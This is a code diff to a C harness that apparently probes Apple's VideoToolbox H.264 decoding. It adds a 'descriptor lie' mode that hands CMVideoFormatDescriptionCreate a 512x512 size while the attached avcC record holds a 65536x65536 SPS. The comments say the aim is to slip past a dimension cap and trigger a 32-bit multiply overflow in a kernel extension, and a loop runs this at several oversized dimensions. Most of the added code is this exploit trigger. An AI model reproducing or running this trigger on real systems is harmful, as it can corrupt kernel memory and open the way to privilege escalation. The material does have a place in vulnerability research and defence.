@@ -279,10 +279,57 @@ static int run_one(int mb_w, int mb_h, int mode, int level)
 		rlinef("    %s", hx);
 	}
 	CMVideoFormatDescriptionRef fmt = NULL;
-	OSStatus st = CMVideoFormatDescriptionCreateFromH264ParameterSets(
-	    kCFAllocatorDefault, 2, ps, psz, 4, &fmt);
-	rlinef("  CMVideoFormatDescriptionCreateFromH264ParameterSets st=%d", (int)st);
-	if (st != noErr || !fmt) return 1;
+	if (mode == 2) {
+		/* MODE 2 - the descriptor lie: CMVideoFormatDescriptionCreate receives a
+		   small (512x512) descriptor that sails past the session dimension cap,
+		   while the avcC record carries the HUGE SPS so the kext side parses
+		   65536x65536 and hits the 32-bit multiply. The `avcc`/`avccl` built
+		   above already carry the huge SPS in this mode (avc_sps == &sps). */
+		CFDataRef avcData = CFDataCreate(kCFAllocatorDefault, avcc, (CFIndex)avccl);
+		if (!avcData) { rline("  MODE2: CFDataCreate failed"); return 1; }
+		const void *keys[1] = { CFSTR("avcC") };
+		const void *vals[1] = { avcData };
+		CFDictionaryRef ext = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 1,
+		                                         &kCFTypeDictionaryKeyCallBacks,
+		                                         &kCFTypeDictionaryValueCallBacks);
+		OSStatus st2 = CMVideoFormatDescriptionCreate(kCFAllocatorDefault,
+		                                              kCMVideoCodecType_H264,
+		                                              512, 512, ext, &fmt);
+		rlinef("  MODE2 CMVideoFormatDescriptionCreate(512x512 + huge avcC) st=%d", (int)st2);
+		if (ext) CFRelease(ext);
+		if (avcData) CFRelease(avcData);
+		if (st2 != noErr || !fmt) return 1;
+		{
+			CMVideoDimensions dim = CMVideoFormatDescriptionGetDimensions(fmt);
+			rlinef("  mode2 descriptor says %d x %d (the lie)", dim.width, dim.height);
+		}
+	} else {
+		/* format description straight from the parameter sets - the SPS carries the
+		   real dimensions; the wrapper's w/h are only a hint. */
+		const uint8_t *ps[2] = { avc_sps->buf, pps.buf };
+		size_t psz[2] = { (size_t)bw_len(avc_sps), (size_t)bw_len(&pps) };
+		/* hex-dump the exact bytes we hand to Apple - the -12712 needs ground truth */
+		{
+			rlinef("  PS[0] len=%zu bytes:", psz[0]);
+			size_t dn = psz[0] < 24 ? psz[0] : 24;
+			char hx[128]; size_t ho = 0;
+			for (size_t i = 0; i < dn && ho < sizeof(hx) - 3; i++)
+				ho += (size_t)snprintf(hx + ho, sizeof(hx) - ho, "%02x", avc_sps->buf[i]);
+			hx[ho] = 0;
+			rlinef("    %s", hx);
+			rlinef("  PS[1] len=%zu bytes:", psz[1]);
+			dn = psz[1] < 24 ? psz[1] : 24;
+			ho = 0;
+			for (size_t i = 0; i < dn && ho < sizeof(hx) - 3; i++)
+				ho += (size_t)snprintf(hx + ho, sizeof(hx) - ho, "%02x", pps.buf[i]);
+			hx[ho] = 0;
+			rlinef("    %s", hx);
+		}
+		OSStatus st = CMVideoFormatDescriptionCreateFromH264ParameterSets(
+		    kCFAllocatorDefault, 2, ps, psz, 4, &fmt);
+		rlinef("  CMVideoFormatDescriptionCreateFromH264ParameterSets st=%d", (int)st);
+		if (st != noErr || !fmt) return 1;
+	}
 	{
 		CMVideoDimensions dim = CMVideoFormatDescriptionGetDimensions(fmt);
 		rlinef("  format description says %d x %d", dim.width, dim.height);
@@ -420,6 +467,14 @@ int main(void)
 			for (int i = 0; i < lad_n; i++) {
 				rlinef("--- LADDER mode=1 %dx%d mbs level=%d ---", lad[i][0], lad[i][1], lad[i][2]);
 				run_one(lad[i][0], lad[i][1], 1, lad[i][2]);
+			}
+			/* MODE 2 - the descriptor lie: small descriptor (512x512) passes the
+			   session cap; the avcC record carries the huge SPS for the kext. */
+			static const int lad2[][2] = { { 4096, 4096 }, { 4097, 4097 }, { 2049, 4097 }, { 3073, 4097 } };
+			const int lad2_n = sizeof(lad2) / sizeof(lad2[0]);
+			for (int i = 0; i < lad2_n; i++) {
+				rlinef("--- LADDER mode=2 (descriptor lie) %dx%d mbs level=51 ---", lad2[i][0], lad2[i][1]);
+				run_one(lad2[i][0], lad2[i][1], 2, 51);
 			}
 		}
 		rline("vtdec DONE");
